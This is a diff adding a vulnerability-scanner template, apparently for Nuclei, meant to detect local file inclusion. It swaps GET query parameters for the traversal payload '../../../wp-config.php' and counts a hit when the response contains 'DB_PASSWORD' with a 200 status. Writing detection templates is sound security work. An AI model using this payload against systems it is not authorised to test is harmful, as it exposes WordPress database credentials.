@@ -1,0 +1,38 @@
+id: fuzz-lfi-custom
+
+info:
+  name: Custom Local File Inclusion (LFI) Detection
+  author: netbaan
+  severity: medium
+  description: |
+    This template is designed to detect LFI vulnerabilities using a specified payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      lfi:
+        - "../../../wp-config.php"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{lfi}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "DB_PASSWORD"  # Checking for a string that typically exists in wp-config.php
+
+      - type: status
+        status:
+          - 200  # Check for a 200 status response which indicates the file was successfully included
